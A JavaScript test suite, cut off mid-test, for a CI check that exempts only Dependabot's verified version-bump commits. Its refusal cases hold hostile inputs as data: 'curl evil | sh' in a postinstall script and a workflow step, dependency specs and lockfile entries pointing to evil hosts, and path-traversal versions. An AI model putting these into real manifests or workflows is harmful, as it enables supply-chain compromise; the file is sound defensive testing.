// dependabot-exemption.test.mjs — the narrow Dependabot exception of check-commit-identity.mjs
// (owner decisions 2026-11-15 and 2026-11-19): passes only for Dependabot's own GitHub-signed
// commits on its branch that only bump existing dependency versions (root, workspaces, the standalone
// tools/lhci lock, lock-only resolution updates within the declared ranges) or action pin shas; every refusal case fails. Real git
// in throw-away repos, the GitHub API is a loopback stub (TLDCOST_GITHUB_API), no network.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawn } from 'node:child_process';
import { createHash } from 'node:crypto';
import { createServer } from 'node:http';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { gunzipSync, gzipSync } from 'node:zlib';
import {
  BUNDLE_LIMITS,
  DEPENDABOT,
  LOCK_VERSION,
  PACKAGE_NAME,
  PIN_LINE,
  VERSION_SPEC,
  WEB_FLOW,
  apiBase,
  bundleFindings,
  STANDALONE_LOCK_DIRS,
  diffHunks,
  lockDir,
  lockOnlyFinding,
  manifestMatcher,
  packageJsonFinding,
  packageKeyMatcher,
  packageLockFinding,
  pinOnlyDiff,
  registryBase,
  standaloneManifestDir,
  tarFiles,
} from './lib/dependabot-exemption.mjs';

const SCRIPT = resolve(import.meta.dirname, 'check-commit-identity.mjs');
const OK = 'coins4me@users.noreply.github.com';
const TOKEN = 'ghs_TESTTOKENthatmustneverbeprinted';
const BRANCH = 'dependabot/npm_and_yarn/prod-abc123';
const [SHA_A, SHA_B, SHA_C] = ['a', 'b', 'c'].map((c) => c.repeat(40));
const REG = 'https://registry.npmjs.org';

const json = (o) => JSON.stringify(o, null, 2) + '\n';
const ROOT = {
  name: 'x',
  private: true,
  workspaces: ['packages/*', 'site'],
  scripts: { build: 'tsc -b' },
  dependencies: { 'left-pad': '^1.0.0' },
  devDependencies: { vitest: '^3.0.0' },
  overrides: { glob: { minimatch: '9.0.0' } },
};
const SITE = { name: 'site', dependencies: { astro: '5.0.0' } };
const LOCK = {
  name: 'x',
  lockfileVersion: 3,
  packages: {
    '': { name: 'x', workspaces: ['packages/*', 'site'], dependencies: { 'left-pad': '^1.0.0' } },
    // an old entry: unchanged entries are not judged again (sha1 is fine while untouched)
    'node_modules/old': {
      version: '0.1.0',
      resolved: `${REG}/old/-/old-0.1.0.tgz`,
      integrity: 'sha1-AAAA',
    },
    'node_modules/left-pad': {
      version: '1.0.0',
      resolved: `${REG}/left-pad/-/left-pad-1.0.0.tgz`,
      integrity: 'sha512-AAAA',
    },
    'node_modules/site': { resolved: 'site', link: true },
    site: { name: 'site', dependencies: { astro: '5.0.0' } },
  },
};
/** Lockfile entry from the npm registry: its own tarball, a sha512 integrity (synthetic). */
const reg = (name, version, extra = {}) => ({
  version,
  resolved: `${REG}/${name}/-/${name.split('/').pop()}-${version}.tgz`,
  integrity: `sha512-${Buffer.from(`${name}@${version}`).toString('base64')}`,
  dev: true,
  ...extra,
});
// the standalone tools/lhci lock, in the shape of a transitive security update: a proxy agent
// pulls in an FTP client through get-uri; the update bumps the chain, a major included
const LHCI = { name: 'lhci', private: true, devDependencies: { '@lhci/cli': '0.16.1' } };
const LHCI_LOCK = {
  name: 'lhci',
  lockfileVersion: 3,
  requires: true,
  packages: {
    '': { name: 'lhci', devDependencies: { '@lhci/cli': '0.16.1' } },
    'node_modules/@lhci/cli': reg('@lhci/cli', '0.16.1', {
      dependencies: { 'proxy-agent': '^8.0.2' },
    }),
    'node_modules/proxy-agent': reg('proxy-agent', '8.0.2', {
      dependencies: { 'get-uri': '8.0.1' },
    }),
    'node_modules/get-uri': reg('get-uri', '8.0.1', { dependencies: { 'basic-ftp': '^5.3.1' } }),
    'node_modules/basic-ftp': reg('basic-ftp', '5.3.1'),
    'node_modules/quickjs-wasi': reg('quickjs-wasi', '2.2.0'),
  },
};
const LHCI_BUMP = {
  'node_modules/proxy-agent': reg('proxy-agent', '8.0.3', { dependencies: { 'get-uri': '8.0.2' } }),
  'node_modules/get-uri': reg('get-uri', '8.0.2', { dependencies: { 'basic-ftp': '^6.2.4' } }),
  'node_modules/basic-ftp': reg('basic-ftp', '6.2.6'),
  'node_modules/quickjs-wasi': reg('quickjs-wasi', '3.7.0'),
};
const lhciLockWith = (pkgs) => json({ ...LHCI_LOCK, packages: { ...LHCI_LOCK.packages, ...pkgs } });
const WORKFLOW = `name: X
on: push
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@${SHA_A} # v1.0.0
      - uses: actions/setup-node@${SHA_A} # v2.0.0
      - run: echo hi
  reuse:
    uses: some-org/shared/.github/workflows/ci.yml@${SHA_A} # v1
`;

/** Throw-away repo with root/workspace manifests, a lockfile, a workflow and a README. */
function repo() {
  const dir = mkdtempSync(join(tmpdir(), 'chnet-depbot-'));
  const env = (a, c) => ({
    PATH: process.env.PATH,
    HOME: tmpdir(),
    GIT_CONFIG_NOSYSTEM: '1',
    GIT_CONFIG_GLOBAL: '/dev/null',
    GIT_AUTHOR_NAME: 'a',
    GIT_AUTHOR_EMAIL: a,
    GIT_COMMITTER_NAME: 'c',
    GIT_COMMITTER_EMAIL: c,
  });
  const g = (args, a = OK, c = OK) =>
    execFileSync('git', ['-C', dir, ...args], { encoding: 'utf8', env: env(a, c) }).trim();
  const write = (path, text) => {
    mkdirSync(join(dir, path, '..'), { recursive: true });
    writeFileSync(join(dir, path), text);
  };
  g(['init', '-q', '-b', 'main']);
  write('package.json', json(ROOT));
  write('package-lock.json', json(LOCK));
  write('packages/core/package.json', json({ name: 'core', dependencies: { zod: '^3.0.0' } }));
  write('site/package.json', json(SITE));
  write('other/package.json', json({ name: 'other', dependencies: { zod: '^3.0.0' } }));
  write('tools/lhci/package.json', json(LHCI));
  write('tools/lhci/package-lock.json', json(LHCI_LOCK));
  write('tools/other/package.json', json(LHCI));
  write('tools/other/package-lock.json', json(LHCI_LOCK));
  write('.github/workflows/ci.yml', WORKFLOW);
  write('README.md', 'x\n');
  g(['add', '-A']);
  g(['commit', '-q', '-m', 'base']);
  const base = g(['rev-parse', 'HEAD']);
  /** Commit the given file contents (null: delete the file) as author a / committer c. */
  const commit = (files, a = DEPENDABOT.email, c = WEB_FLOW.email) => {
    for (const [path, text] of Object.entries(files)) {
      if (text === null) rmSync(join(dir, path));
      else write(path, text);
    }
    g(['add', '-A']);
    g(['commit', '-q', '-m', 'bump'], a, c);
  };
  return { dir, base, commit, head: () => g(['rev-parse', 'HEAD']) };
}

/** GitHub API answer for a Dependabot commit, verified (overrides per test). */
const apiCommit = (sha, over = {}) => ({
  sha,
  author: { login: DEPENDABOT.login },
  committer: { login: WEB_FLOW.login },
  commit: {
    author: { email: DEPENDABOT.email },
    committer: { email: WEB_FLOW.email },
    verification: { verified: true, reason: 'valid' },
  },
  ...over,
});

/** Loopback stub of GET /repos/{repo}/commits/{sha}; `answer(sha)` -> [status, body]. */
async function stub(answer) {
  const seen = [];
  const server = createServer((req, res) => {
    seen.push({ url: req.url, auth: req.headers.authorization });
    const [status, body] = answer(req.url.split('/').pop());
    res.writeHead(status, { 'content-type': 'application/json' });
    res.end(JSON.stringify(body));
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const url = `http://127.0.0.1:${server.address().port}`;
  return { url, seen, close: () => new Promise((r) => server.close(r)) };
}

/** Run the script (async: the stub server lives in this process). */
function run(dir, args, env = {}) {
  return new Promise((done) => {
    const p = spawn('node', [SCRIPT, ...args], {
      cwd: dir,
      env: { PATH: process.env.PATH, ...env },
    });
    let out = '';
    p.stdout.on('data', (d) => (out += d));
    p.stderr.on('data', (d) => (out += d));
    p.on('close', (code) => done({ code, out }));
  });
}

const verifiedApi = (sha) => [200, apiCommit(sha)];

/** Range check of the repo with the Dependabot context; api answers via the stub. */
async function check(
  r,
  { api = verifiedApi, branch = BRANCH, actor = DEPENDABOT.login, env, extraEnv = {} } = {},
) {
  const s = await stub(api);
  try {
    const res = await run(
      r.dir,
      ['--range', `${r.base}..${r.head()}`, '--branch', branch, '--actor', actor],
      env ?? {
        GITHUB_REPOSITORY: 'chnet/tldcost',
        GITHUB_TOKEN: TOKEN,
        TLDCOST_GITHUB_API: s.url,
        ...extraEnv,
      },
    );
    return { ...res, seen: s.seen };
  } finally {
    await s.close();
  }
}

/** One Dependabot commit with these files must be refused with a message matching `re`. */
async function refused(files, re) {
  const r = repo();
  r.commit(files);
  const res = await check(r);
  assert.equal(res.code, 1, res.out);
  assert.match(res.out, re);
  assert.match(res.out, /author e-mail not on the CHnet allowlist/);
  assert.ok(!res.out.includes(TOKEN));
}

const rootWith = (over) => json({ ...ROOT, ...over });
const lockWith = (pkgs) => json({ ...LOCK, packages: { ...LOCK.packages, ...pkgs } });
const bumpedLeftPad = {
  'node_modules/left-pad': {
    version: '1.3.0',
    resolved: `${REG}/left-pad/-/left-pad-1.3.0.tgz`,
    integrity: 'sha512-BBBB',
  },
};
const astro = (v) => ({ 'site/package.json': json({ ...SITE, dependencies: { astro: v } }) });

test('positive: version bumps (root, workspace, override, lock) and pin sha updates pass', async () => {
  const r = repo();
  r.commit({
    'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }),
    'package-lock.json': lockWith({
      ...bumpedLeftPad,
      '': { ...LOCK.packages[''], dependencies: { 'left-pad': '^1.3.0' } },
    }),
  });
  r.commit(astro('5.1.2'));
  r.commit({
    'packages/core/package.json': json({ name: 'core', dependencies: { zod: '^3.1.0' } }),
    'package.json': rootWith({ overrides: { glob: { minimatch: '9.0.5' } } }),
  });
  r.commit({
    '.github/workflows/ci.yml': WORKFLOW.replace(
      `checkout@${SHA_A} # v1.0.0`,
      `checkout@${SHA_B} # v1.1.0`,
    ).replace(`ci.yml@${SHA_A} # v1`, `ci.yml@${SHA_C} # v1.2`),
  });
  const res = await check(r);
  assert.equal(res.code, 0, res.out);
  assert.match(res.out, /Dependabot exception: 4 commit\(s\)/);
  assert.equal(res.seen.length, 4);
  assert.ok(res.seen.every((x) => x.auth === `Bearer ${TOKEN}`));
  assert.ok(res.seen.every((x) => x.url.startsWith('/repos/chnet/tldcost/commits/')));
  assert.ok(!res.out.includes(TOKEN));
});

test('refused: package.json – new dependency, script, other field, non-version spec', async () => {
  await refused(
    { 'package.json': rootWith({ dependencies: { 'left-pad': '^1.0.0', evil: '1.0.0' } }) },
    /dependencies changed beyond the version/,
  );
  await refused(
    { 'package.json': rootWith({ scripts: { build: 'tsc -b', postinstall: 'curl evil | sh' } }) },
    /a field other than a dependency version changed/,
  );
  await refused(
    { 'package.json': rootWith({ bin: { x: 'evil.js' } }) },
    /a top-level field was added or removed/,
  );
  await refused(
    { 'package.json': rootWith({ name: 'renamed' }) },
    /a field other than a dependency version changed/,
  );
  for (const spec of [
    'github:evil/left-pad',
    'file:../evil',
    'https://evil.example/x.tgz',
    'npm:evil@1.0.0',
  ]) {
    await refused(
      { 'package.json': rootWith({ dependencies: { 'left-pad': spec } }) },
      /dependencies changed beyond the version/,
    );
  }
});

test('refused: package-lock.json resolved outside the npm registry, a moved link', async () => {
  await refused(
    {
      'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }),
      'package-lock.json': lockWith({
        'node_modules/left-pad': { version: '1.3.0', resolved: 'https://evil.example/lp.tgz' },
      }),
    },
    /without its own registry.npmjs.org tarball and sha512 integrity/,
  );
  // right host, wrong package: evil-pkg installed as react; also: no integrity, an npm alias
  for (const entry of [
    {
      'node_modules/react': {
        version: '18.3.2',
        resolved: `${REG}/evil-pkg/-/evil-pkg-1.0.0.tgz`,
        integrity: 'sha512-CCCC',
      },
    },
    { 'node_modules/react': { version: '18.3.2', resolved: `${REG}/react/-/react-18.3.2.tgz` } },
    // path traversal through the version: string-equal to registryTarball, resolves to evil-pkg
    {
      'node_modules/react': {
        version: '1/../../../evil-pkg/-/evil-pkg-1.0.0',
        resolved: `${REG}/react/-/react-1/../../../evil-pkg/-/evil-pkg-1.0.0.tgz`,
        integrity: 'sha512-CCCC',
      },
    },
    {
      'node_modules/react': {
        name: 'evil-pkg',
        version: '1.0.0',
        resolved: `${REG}/evil-pkg/-/evil-pkg-1.0.0.tgz`,
        integrity: 'sha512-CCCC',
      },
    },
  ]) {
    await refused(
      {
        'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }),
        'package-lock.json': lockWith({ ...bumpedLeftPad, ...entry }),
      },
      /without its own registry.npmjs.org tarball and sha512 integrity/,
    );
  }
  // a name segment starting with '.': no package key (refused before the tarball check)
  await refused(
    {
      'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }),
      'package-lock.json': lockWith({
        ...bumpedLeftPad,
        'node_modules/..': {
          version: '1.0.0',
          resolved: `${REG}/../-/..-1.0.0.tgz`,
          integrity: 'sha512-CCCC',
        },
      }),
    },
    /an added or changed key that is not node_modules\/<name> at the root or in a workspace/,
  );
  await refused(
    {
      'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }),
      'package-lock.json': lockWith({ 'node_modules/site': { resolved: '../evil', link: true } }),
    },
    /a workspace link changed/,
  );
});

test('refused: workflows – repo swap, added step, removed pin, reusable swap, other line', async () => {
  const swap = (from, to) => ({ '.github/workflows/ci.yml': WORKFLOW.replace(from, to) });
  const pinned = /a workflow change other than a sha update of an existing uses: pin/;
  await refused(swap(`actions/checkout@${SHA_A}`, `evil-org/checkout@${SHA_B}`), pinned);
  await refused(
    swap('      - run: echo hi', `      - uses: other-org/action@${SHA_B}\n      - run: echo hi`),
    pinned,
  );
  await refused(
    swap(
      `checkout@${SHA_A} # v1.0.0`,
      `checkout@${SHA_B} # v1.1.0\n      - uses: other-org/action@${SHA_B}`,
    ),
    pinned,
  );
  await refused(swap(`      - uses: actions/setup-node@${SHA_A} # v2.0.0\n`, ''), pinned);
  await refused(
    swap(
      `some-org/shared/.github/workflows/ci.yml@${SHA_A}`,
      `evil-org/shared/.github/workflows/ci.yml@${SHA_B}`,
    ),
    pinned,
  );
  await refused(swap('echo hi', 'curl evil | sh'), pinned);
});

test('refused: other files, a non-workspace package.json, added files', async () => {
  await refused({ 'README.md': 'changed\n' }, /a file outside the manifests and workflow pins/);
  await refused(
    { 'other/package.json': json({ name: 'other', dependencies: { zod: '^3.1.0' } }) },
    /a file outside the manifests and workflow pins/,
  );
  await refused(
    { 'packages/new/package.json': json({ name: 'n' }) },
    /only modified files allowed \(status A\)/,
  );
});

test('refused: spoofed Dependabot e-mail without a GitHub signature', async () => {
  const r = repo();
  r.commit(astro('5.1.2'));
  const res = await check(r, {
    api: (sha) => {
      const body = apiCommit(sha);
      body.commit.verification = { verified: false, reason: 'unsigned' };
      return [200, body];
    },
  });
  assert.equal(res.code, 1, res.out);
  assert.match(res.out, /signature not verified/);
  assert.ok(!res.out.includes(TOKEN));
});

test('refused: verified, but GitHub maps author/committer to other logins', async () => {
  const r = repo();
  r.commit(astro('5.1.2'));
  const res = await check(r, {
    api: (sha) => [
      200,
      apiCommit(sha, { author: { login: 'someone' }, committer: { login: 'someone' } }),
    ],
  });
  assert.equal(res.code, 1, res.out);
  assert.match(res.out, /does not name dependabot\[bot\] as author/);
  assert.match(res.out, /does not name web-flow as committer/);
});

test('refused: wrong branch, or not opened/pushed by Dependabot (no API call)', async () => {
  for (const ctx of [
    { branch: 'feature/x' },
    { branch: 'main' },
    { actor: 'coins4me' },
    { actor: '' },
  ]) {
    const r = repo();
    r.commit(astro('5.1.2'));
    const res = await check(r, ctx);
    assert.equal(res.code, 1, JSON.stringify(ctx) + res.out);
    assert.equal(res.seen.length, 0, 'no API call outside the context');
  }
});

test('refused: mixed range (Dependabot plus a CHnet commit), mixed commit (human committer)', async () => {
  const range = repo();
  range.commit(astro('5.1.2'));
  range.commit(astro('5.1.3'), OK, OK);
  const r1 = await check(range);
  assert.equal(r1.code, 1, r1.out);
  assert.equal(r1.seen.length, 0, 'no exception, so no API call');
  const mixed = repo();
  mixed.commit(astro('5.1.2'), DEPENDABOT.email, OK);
  const r2 = await check(mixed);
  assert.equal(r2.code, 1, r2.out);
  assert.equal(r2.seen.length, 0);
});

test('refused: API errors and a missing token fail closed', async () => {
  const r = repo();
  r.commit(astro('5.1.2'));
  const notFound = await check(r, { api: () => [404, { message: 'Not Found' }] });
  assert.equal(notFound.code, 1, notFound.out);
  assert.match(notFound.out, /GitHub API status 404/);
  const other = await check(r, { api: () => [200, apiCommit(SHA_B)] });
  assert.equal(other.code, 1, other.out);
  assert.match(other.out, /answered another commit/);
  const noToken = await check(r, { env: { GITHUB_REPOSITORY: 'chnet/tldcost' } });
  assert.equal(noToken.code, 1, noToken.out);
  assert.match(noToken.out, /GITHUB_REPOSITORY\/GITHUB_TOKEN not set/);
});

test('without --branch/--actor (pre-push, old callers) a Dependabot commit fails as before', async () => {
  const r = repo();
  r.commit(astro('5.1.2'));
  const res = await run(r.dir, ['--range', `${r.base}..${r.head()}`]);
  assert.equal(res.code, 1, res.out);
});

test('refused: lockfile – sha1 on a new entry, a changed entry without resolved, root entry or top-level changes', async () => {
  const bump = { 'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }) };
  const re = /without its own registry.npmjs.org tarball and sha512 integrity/;
  await refused(
    {
      ...bump,
      'package-lock.json': lockWith({
        ...bumpedLeftPad,
        'node_modules/new-dep': {
          version: '1.0.0',
          resolved: `${REG}/new-dep/-/new-dep-1.0.0.tgz`,
          integrity: 'sha1-AAAA',
        },
      }),
    },
    re,
  );
  await refused(
    {
      ...bump,
      'package-lock.json': lockWith({
        'node_modules/left-pad': { version: '1.3.0', inBundle: true },
      }),
    },
    re,
  );
  await refused(
    {
      ...bump,
      'package-lock.json': lockWith({
        ...bumpedLeftPad,
        '': { ...LOCK.packages[''], dependencies: { 'left-pad': '^1.3.0', evil: '1.0.0' } },
      }),
    },
    /root\/workspace entry: dependencies changed beyond the version/,
  );
  await refused(
    { ...bump, 'package-lock.json': json({ ...LOCK, lockfileVersion: 2 }) },
    /a top-level field other than packages changed/,
  );
});

// a real aws-cdk-lib bump (Dependabot): the parent with its own tarball and sha512, and the bundled
// entries that change with it ("inBundle": true, no resolved/integrity, as npm writes them)
const CDK = JSON.parse(
  readFileSync(resolve(import.meta.dirname, 'fixtures/lock-bundled/aws-cdk-lib.json'), 'utf8'),
);
const CDK_KEY = 'node_modules/aws-cdk-lib';
const BUNDLED_IN = (name) => `${CDK_KEY}/node_modules/${name}`;
const bundled = (version = '1.0.0', extra = {}) => ({ version, inBundle: true, ...extra });
const NO_TARBALL = /without its own registry.npmjs.org tarball and sha512 integrity/;
const sameEntry = (a, b) => JSON.stringify(a) === JSON.stringify(b);

test('lockfile: bundled entries pass only under an ancestor with its own tarball and sha512', async () => {
  const ws = ROOT.workspaces;
  const lockFinding = (beforePkgs, afterPkgs, bundles = []) =>
    packageLockFinding(lockWith(beforePkgs), lockWith(afterPkgs), ws, bundles);
  // (1) the real excerpt: 20 bundled entries, 6 changed or added and 14 unchanged, none with
  // resolved or integrity
  const bundledKeys = Object.keys(CDK.after).filter((k) => k !== CDK_KEY);
  const changedKeys = bundledKeys.filter((k) => !sameEntry(CDK.after[k], CDK.before[k]));
  assert.equal(bundledKeys.length, 20);
  assert.equal(changedKeys.length, 6);
  for (const k of bundledKeys) {
    assert.equal(CDK.after[k].inBundle, true, k);
    assert.ok(!Object.hasOwn(CDK.after[k], 'resolved'), k);
    assert.ok(!Object.hasOwn(CDK.after[k], 'integrity'), k);
  }
  const checks = [];
  assert.equal(lockFinding(CDK.before, CDK.after, checks), '');
  // the anchor changed: one tarball check per bundled entry under it, changed or not, with the
  // anchor's resolved/integrity and the path below it
  const byKey = (a, b) => a.key.localeCompare(b.key);
  assert.deepEqual(
    [...checks].sort(byKey),
    bundledKeys
      .map((k) => ({
        key: k,
        resolved: CDK.after[CDK_KEY].resolved,
        integrity: CDK.after[CDK_KEY].integrity,
        path: `package/${k.slice(CDK_KEY.length + 1)}/package.json`,
        name: k.slice(k.lastIndexOf('node_modules/') + 'node_modules/'.length),
        version: CDK.after[k].version,
      }))
      .sort(byKey),
  );
  // without a collector for the tarball checks a bundled entry is refused (fail closed)
  assert.match(
    packageLockFinding(lockWith(CDK.before), lockWith(CDK.after), ws),
    /bundled package that cannot be checked against its tarball/,
  );
  // (5) an unchanged parent: only the changed bundled entries are checked in its tarball
  const sameParent = { ...CDK.before, [CDK_KEY]: CDK.after[CDK_KEY] };
  const unchangedParent = [];
  assert.equal(lockFinding(sameParent, CDK.after, unchangedParent), '');
  assert.deepEqual(unchangedParent.map((c) => c.key).sort(), [...changedKeys].sort());
  // only the anchor changes (its bundled entries stay): all 20 are still checked, and without a
  // collector they are refused
  const onlyAnchor = { ...CDK.after, [CDK_KEY]: CDK.before[CDK_KEY] };
  const onlyAnchorChecks = [];
  assert.equal(lockFinding(onlyAnchor, CDK.after, onlyAnchorChecks), '');
  assert.equal(onlyAnchorChecks.length, 20);
  assert.match(
    packageLockFinding(lockWith(onlyAnchor), lockWith(CDK.after), ws),
    /bundled package that cannot be checked against its tarball here/,
  );
  // an unchanged bundled entry under a changed anchor that cannot be checked is refused
  const yaml = BUNDLED_IN('yaml');
  const oddYaml = { ...CDK.before[yaml], resolved: `${REG}/yaml/-/yaml-1.10.3.tgz` };
  assert.match(
    lockFinding({ ...CDK.before, [yaml]: oddYaml }, { ...CDK.after, [yaml]: oddYaml }),
    /bundled package under an added or changed package that cannot be checked/,
  );
  // ... but one bundled by a nearer package that did not change is not part of this check
  const q = BUNDLED_IN('q');
  const nearer = { [q]: reg('q', '1.0.0'), [`${q}/node_modules/k`]: bundled() };
  const nearerChecks = [];
  assert.equal(
    lockFinding({ ...CDK.before, ...nearer }, { ...CDK.after, ...nearer }, nearerChecks),
    '',
  );
  assert.ok(!nearerChecks.some((c) => c.key.startsWith(`${q}/`)));
  assert.equal(nearerChecks.length, 20);
  // a bundled entry of a bundled entry: the nearest ancestor that is not bundled is checked
  const deep = `${BUNDLED_IN('minimatch')}/node_modules/x`;
  const deepChecks = [];
  assert.equal(lockFinding(CDK.before, { ...CDK.after, [deep]: bundled() }, deepChecks), '');
  assert.ok(
    deepChecks.some(
      (c) =>
        c.key === deep && c.path === 'package/node_modules/minimatch/node_modules/x/package.json',
    ),
  );

  // (2) no checked ancestor
  const parent = CDK.after[CDK_KEY];
  for (const [what, beforePkgs, afterPkgs] of [
    ['ancestor missing', {}, { 'node_modules/ghost/node_modules/x': bundled() }],
    [
      'unchanged ancestor without resolved',
      { 'node_modules/plain': { version: '1.0.0' } },
      {
        'node_modules/plain': { version: '1.0.0' },
        'node_modules/plain/node_modules/x': bundled(),
      },
    ],
    [
      'unchanged ancestor with sha1 integrity',
      {},
      { 'node_modules/old/node_modules/x': bundled() },
    ],
    ['ancestor is a workspace link', {}, { 'node_modules/site/node_modules/x': bundled() }],
    [
      'ancestor with a foreign tarball',
      {},
      {
        [CDK_KEY]: { ...parent, resolved: `${REG}/evil/-/evil-2.278.0.tgz` },
        [BUNDLED_IN('x')]: bundled(),
      },
    ],
    [
      'ancestor marked inBundle false',
      {},
      { [CDK_KEY]: { ...parent, inBundle: false }, [BUNDLED_IN('x')]: bundled() },
    ],
    [
      'bundled ancestor in between missing',
      {},
      { [CDK_KEY]: parent, [`${BUNDLED_IN('gone')}/node_modules/x`]: bundled() },
    ],
  ]) {
    assert.match(lockFinding(beforePkgs, afterPkgs), NO_TARBALL, what);
  }

  // (3) a bundled entry that carries resolved, integrity, an alias or a bad version
  const mm = BUNDLED_IN('minimatch');
  for (const extra of [
    { resolved: `${REG}/minimatch/-/minimatch-11.0.9.tgz`, integrity: 'sha512-AAAA' },
    { resolved: `${REG}/minimatch/-/minimatch-11.0.9.tgz` },
    { resolved: 'https://evil.example/minimatch-11.0.9.tgz' },
    { integrity: 'sha512-AAAA' },
    { name: 'minimatch' },
    { version: '11.0.9/../x' },
    { inBundle: 'true' },
  ]) {
    const after = { ...CDK.after, [mm]: { ...CDK.after[mm], ...extra } };
    assert.match(lockFinding(CDK.before, after), NO_TARBALL, JSON.stringify(extra));
  }

  // (4) a forged inBundle at the top level of the lock or of a workspace, or on root/workspace entries
  for (const key of [
    'node_modules/x',
    'node_modules/left-pad',
    'site/node_modules/x',
    'packages/core/node_modules/x',
  ]) {
    assert.match(lockFinding({}, { [key]: bundled('1.3.0') }), NO_TARBALL, key);
  }
  // a workspace entry never counts as the ancestor, not even one shaped like a registry entry
  const wsEntry = {
    'packages/core': {
      version: '1.0.0',
      resolved: `${REG}/e/-/e-1.0.0.tgz`,
      integrity: 'sha512-AAAA',
    },
  };
  assert.match(
    lockFinding(wsEntry, { ...wsEntry, 'packages/core/node_modules/x': bundled() }),
    NO_TARBALL,
  );
  for (const key of ['', 'site']) {
    assert.match(
      lockFinding({}, { [key]: { ...LOCK.packages[key], inBundle: true } }),
      /root\/workspace entry: a top-level field was added or removed/,
      key,
    );
  }

  // a parentless bundled entry fails the whole exemption without any download
  await refused(
    { 'package-lock.json': lockWith({ 'node_modules/ghost/node_modules/x': bundled() }) },
    NO_TARBALL,
  );
});

/** One ustar header block (checksum computed); `prefix` is the ustar name prefix. */
function tarHeader(name, size, type, prefix = '') {
  const h = Buffer.alloc(512);
  h.write(name, 0, 100, 'utf8');
  h.write('0000644\0', 100);
  h.write('0000000\0', 108);
  h.write('0000000\0', 116);
  h.write(`${size.toString(8).padStart(11, '0')}\0`, 124);
  h.write('00000000000\0', 136);
  h.write(type, 156);
  h.write('ustar\0', 257);
  h.write('00', 263);
  h.write(prefix, 345, 155, 'utf8');
  h.fill(0x20, 148, 156);
  let sum = 0;
  for (const b of h) sum += b;
  h.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148);
  return h;
}
const pad512 = (b) => Buffer.concat([b, Buffer.alloc((512 - (b.length % 512)) % 512)]);
/** One PAX record "<len> <key>=<value>\n" (len counts itself). */
function paxRecord(key, value) {
  const body = ` ${key}=${value}\n`;
  const bodyLen = Buffer.byteLength(body);
  let len = bodyLen + 1;
  while (String(len).length + bodyLen !== len) len = String(len).length + bodyLen;
  return Buffer.from(`${len}${body}`);
}
/** Plain tar of `files` (path -> content); a path over 100 bytes as PAX, GNU long name or ustar prefix. */
function tar(files, { longNames = 'pax', extra = [] } = {}) {
  const parts = [];
  for (const [path, content] of Object.entries(files)) {
    const data = Buffer.from(content);
    let name = path;
    let prefix = '';
    if (Buffer.byteLength(path) > 100) {
      if (longNames === 'pax') {
        const rec = paxRecord('path', path);
        parts.push(tarHeader('PaxHeader/entry', rec.length, 'x'), pad512(rec));
        name = path.slice(0, 100);
      } else if (longNames === 'gnu') {
        const n = Buffer.from(`${path}\0`);
        parts.push(tarHeader('././@LongLink', n.length, 'L'), pad512(n));
        name = path.slice(0, 100);
      } else {
        const cut = path.lastIndexOf('/', 155);
        prefix = path.slice(0, cut);
        name = path.slice(cut + 1);
      }
    }
    parts.push(tarHeader(name, data.length, '0', prefix), pad512(data));
  }
  return Buffer.concat([...parts, ...extra, Buffer.alloc(1024)]);
}
const tgz = (files, opts) => gzipSync(tar(files, opts));
const sri = (buf) => `sha512-${createHash('sha512').update(buf).digest('base64')}`;
/** Tarball of a bundling package; `bundledPkgs`: path below node_modules/ -> {name, version}. */
const bundlerTgz = (name, version, bundledPkgs, opts) =>
  tgz(
    {
      'package/package.json': JSON.stringify({ name, version }),
      ...Object.fromEntries(
        Object.entries(bundledPkgs).map(([rel, m]) => [
          `package/node_modules/${rel}/package.json`,
          JSON.stringify(m),
        ]),
      ),
    },
    opts,
  );

test('bundled entries: checked in the bundling tarball (exact URL, sha512 first, name and version)', async () => {
  const RES = `${REG}/bundler/-/bundler-1.0.0.tgz`;
  const LONG = `${'x'.repeat(60)}/node_modules/${'y'.repeat(60)}`;
  const content = {
    a: { name: 'a', version: '1.0.0' },
    '@s/b': { name: '@s/b', version: '2.0.0' },
    'a/node_modules/c': { name: 'c', version: '3.0.0' },
  };
  const good = bundlerTgz('bundler', '1.0.0', content);
  const entry = (rel, name, version, over = {}) => ({
    key: `node_modules/bundler/node_modules/${rel}`,
    resolved: RES,
    integrity: sri(good),
    path: `package/node_modules/${rel}/package.json`,
    name,
    version,
    ...over,
  });
  /** fetch stub: answers every call with `body`, records the calls */
  const serve = (body, { status = 200, headers = {} } = {}) => {
    const fn = async (url, opts) => {
      fn.calls.push({ url, opts });
      return new Response(body, { status, headers });
    };
    fn.calls = [];
    return fn;
  };
  const findings = (bundles, fetchFn, limits = BUNDLE_LIMITS) =>
    bundleFindings(SHA_A, bundles, { env: {}, fetchFn, limits });
  const ONE = [entry('a', 'a', '1.0.0')];

  // positive: three entries (one nested) from one download of the exact URL, no redirects
  const ok = serve(good);
  assert.deepEqual(
    await findings(
      [
        entry('a', 'a', '1.0.0'),
        entry('@s/b', '@s/b', '2.0.0'),
        entry('a/node_modules/c', 'c', '3.0.0'),
      ],
      ok,
    ),
    [],
  );
  assert.equal(ok.calls.length, 1);
  assert.equal(ok.calls[0].url, RES);
  assert.equal(ok.calls[0].opts.redirect, 'error');
  // one download per anchor per run, shared across calls through the cache
  const cache = new Map();
  const shared = serve(good);
  for (let i = 0; i < 2; i++) {
    assert.deepEqual(await bundleFindings(SHA_A, ONE, { env: {}, fetchFn: shared, cache }), []);
  }
  assert.equal(shared.calls.length, 1);

  const refusedWith = async (bundles, fetchFn, re, limits) => {
    const out = await findings(bundles, fetchFn, limits);
    assert.equal(out.length, bundles.length, JSON.stringify(out));
    for (const f of out) {
      assert.match(
        f,
        /^aaaaaaaaaa: dependabot exemption: bundled node_modules\/bundler\/node_modules\//,
      );
      assert.match(f, re);
    }
  };
  // entry missing in the tarball
  await refusedWith([entry('d', 'd', '1.0.0')], serve(good), /not in the tarball of the package/);
